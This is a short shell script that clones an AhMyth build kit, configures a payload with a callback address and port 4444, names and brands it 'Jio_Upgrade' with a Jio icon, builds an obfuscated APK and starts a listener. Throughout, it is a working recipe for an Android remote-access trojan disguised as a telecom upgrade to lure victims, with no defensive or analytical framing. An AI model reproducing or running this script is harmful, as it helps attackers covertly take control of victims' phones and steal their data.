# builder.sh
echo "[+] Installing dependencies..."
apt update && apt install -y git wget python3

echo "[+] Cloning AhMyth Builder..."
git clone https://github.com/Hackers365/AhMyth-Build-Kit
cd AhMyth-Build-Kit

echo "[+] Configuring payload..."
echo "LHOST=YOUR_VPS_IP" > config.txt
echo "LPORT=4444" >> config.txt
echo "APK_NAME=Jio_Upgrade" >> config.txt
echo "ICON=jio" >> config.txt

echo "[+] Building APK..."
python3 builder.py --generate --obfuscate

echo "[+] APK saved as dist/Jio_Upgrade.apk"
echo "[+] Start listener: python3 builder.py --listen"
